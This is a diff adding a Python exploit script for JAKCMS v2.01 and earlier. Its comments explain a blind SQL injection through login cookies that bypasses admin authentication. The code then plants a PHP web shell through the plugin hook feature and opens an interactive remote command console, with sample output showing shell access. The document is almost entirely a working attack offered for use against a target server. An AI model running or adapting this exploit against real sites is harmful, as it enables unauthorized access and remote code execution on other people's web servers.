@@ -1,0 +1,147 @@
+#!/usr/bin/python
+#
+# JAKCMS <= v2.01 Code Execution Exploit
+# Explanation:
+#
+# During the authentication process, a check is performed to ensure that the user accessing the page is not already logged in.
+# This process is done by validating the cookies set in the browser as 'JAK_COOKIE_NAME' and 'JAK_COOKIE_PASS'. If the cookies
+# are found to be set, then an SQL statement is executed to help validate if the user is logged in. This functionaility contains
+# a blind SQL Injection vulnerability, triggerable through both the 'JAK_COOKIE_NAME' and 'JAK_COOKIE_PASS' variables.
+#
+# If a valid query is provided and it returns a result set, then the user is granted access to the administrative console by setting
+# the session variable 'JAKLoggedIn' to true. Below is a snippet of code from the 'class/class.userlogin.php' page on lines 65-76
+# highlighting the vulnerable code.
+#
+# public static function jakChecklogged()
+# {
+#    global $jakdb;
+#    if ((isset($_COOKIE['JAK_COOKIE_NAME']) && isset($_COOKIE['JAK_COOKIE_PASS'])) || isset($_SESSION['JAKLoggedIn'])) {
+#       $sql = 'SELECT * FROM '.DB_PREFIX.'user WHERE ((username = "'.COOKIE_NAME.'" AND password = "'.COOKIE_PASS.'") OR (sessi$
+#       $result = $jakdb->query($sql);
+#       if ($jakdb->affected_rows > 0) {
+#          $row = $result->fetch_assoc();
+#          $_SESSION['JAKLoggedIn'] = true;
+#
+# Additionally, functionality in the backend, allows an administrative user to add a "php_hook" whereby adding php content to a
+# page on the website. This allows an attacker essentially backdoor the website in a single request.
+#
+# [mr_me@pluto jak]$ python jakcmsCodeExecution.py -p localhost:8080 -t 192.168.1.7 -d /webapps/jak/
+#
+#	| ------------------------------------------- |
+#	| JAKcms <= v2.01 0day Code Execution Explo!t |
+#	| by mr_me - net-ninja.net ------------------ |
+#
+# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
+# (+) Targeting http://192.168.1.7/
+# (!) Exploit working!
+# (+) Entering interactive remote console (q for quit)
+#
+# mr_me@192.168.1.7# id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# 
+# mr_me@192.168.1.7# uname -a
+# Linux steven-desktop 2.6.32-28-generic #55-Ubuntu SMP Mon Jan 10 21:21:01 UTC 2011 i686 GNU/Linux
+# 
+# mr_me@192.168.1.7# q     
+
+import sys
+import urllib
+import re
+import urllib2
+import getpass
+import base64
+from optparse import OptionParser
+
+usage = "./%prog [<options>] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d /webapps/jak/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="dirPath",
+                  help="Directory path to the CMS")
+
+(options, args) = parser.parse_args()
+
+def banner():
+	print "\n\t| -------------------------------------- |"
+	print "\t| JAKcms <= v2.01 Code Execution Explo!t |"
+	print "\t| by mr_me - net-ninja.net ------------- |\n"
+
+if len(sys.argv) < 5:
+    banner()
+    parser.print_help()
+    sys.exit(1)
+
+def testProxy():
+	check = 1
+	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
+	sys.stdout.flush()
+	try:
+        	req = urllib2.Request("http://www.google.com/")
+		req.set_proxy(options.proxy,"http")
+		check = urllib2.urlopen(req)
+    	except:
+        	check = 0
+        	pass
+    	if check != 0:
+        	sys.stdout.write("proxy is found to be working!\n")
+        	sys.stdout.flush()
+    	else:
+        	print "proxy failed, exiting.."
+        	sys.exit(1)
+
+def interactiveAttack():
+        print "(+) Entering interactive remote console (q for quit)\n"
+        hn = "%s@%s# " % (getpass.getuser(), options.target)
+        preBaseCmd = ""
+        while preBaseCmd != 'q':
+                preBaseCmd = raw_input(hn)
+                cmd64 = base64.b64encode(preBaseCmd)
+                cmdResp = getServerResponse(options.target + options.dirPath + "index.php?p=sitemap&lol=" + cmd64, "", "")
+		result = cmdResp.split("<!DOCTYPE html")[0]
+		print result
+
+def getServerResponse(exploit, header=None, data=None):
+	        try:
+		if header != None:
+			headers = {}
+			headers['Cookie'] = header
+		if data != None:
+			data = urllib.urlencode(data)
+		req = urllib2.Request("http://"+exploit, data, headers)
+		if options.proxy:
+			req.set_proxy(options.proxy,"http")
+		check = urllib2.urlopen(req).read()			
+	except urllib.error.HTTPError, error:
+		check = error.read()
+	except urllib.error.URLError:
+		print "(-) Target connection failed, check your address"
+		sys.exit(1)
+	return check
+
+def doEvilRequest():
+	print "(+) Targeting http://%s/" % (options.target)
+	phpShell = "system(base64_decode($_GET['lol']));"
+	req = options.target + options.dirPath + "admin/index.php?p=plugins&sp=newhook"
+	funnycookie = "JAK_COOKIE_PASS=test; JAK_COOKIE_NAME=admin\"))+and+1=1--+;"
+	data = {'jak_name':'lol', 'jak_hook':'php_sitemap', 'jak_plugin':'0', 'jak_exorder':'1', 'jak_phpcode': phpShell}
+	check = getServerResponse(req, funnycookie, data)
+
+	if re.search("Successful", check):
+		print "(!) Exploit working!"
+		interactiveAttack()
+	else:
+		print "(-) Exploit failed, exiting.."
+		sys.exit(1)
+
+def main():
+	banner()
+	if options.proxy:
+		testProxy()
+	doEvilRequest()
+
+if __name__ == "__main__":
+	main()
